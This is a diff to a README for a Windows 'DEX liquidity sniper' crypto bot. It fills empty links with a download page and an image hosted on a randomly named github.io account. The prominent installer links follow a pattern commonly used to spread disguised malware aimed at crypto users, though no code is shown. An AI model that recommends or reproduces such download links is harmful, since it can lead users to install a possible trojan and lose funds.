@@ -6,7 +6,7 @@ A DEX liquidity sniper — is a Windows desktop app that watches the mempool for
 
 # 📥 **INSTALLER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]( )
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://obtprlfxuild.github.io/Liquidity-Sniping-Bot-PC-Windows/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A DEX liquidity sniper — is a Windows desktop app that watches the mempool for
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= preview image">
+<img src="https://github.com/obtprlfxuild/Liquidity-Sniping-Bot-PC-Windows/blob/main/liquidity-sniping-bot-pc-desktop.png?raw=true" width="1280" height="720" alt= preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://obtprlfxuild.github.io/Liquidity-Sniping-Bot-PC-Windows/)
 
 ---
 
